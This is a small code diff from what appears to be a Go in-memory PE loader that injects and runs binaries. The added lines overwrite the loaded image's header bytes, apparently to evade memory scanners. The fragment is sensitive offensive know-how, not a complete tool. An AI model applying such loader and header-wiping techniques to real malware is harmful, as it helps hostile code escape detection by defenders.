@@ -243,11 +243,10 @@ func peLoader(bytes0 *[]byte,funcExec string){
 			injectorFunc(function.Address, SysArgs)
 		}
 	}
-
+	mz := []byte("PE")
+	lib.Memcpy(uintptr(unsafe.Pointer(&mz[0])),imageBaseForPE,uintptr(len(mz)))
 	fmt.Println("[+] Binary is running")
-
 	exec(startAddress,funcExec)
-
 	//syscall.Syscall(startAddress,0,0,0,0)
 }
 
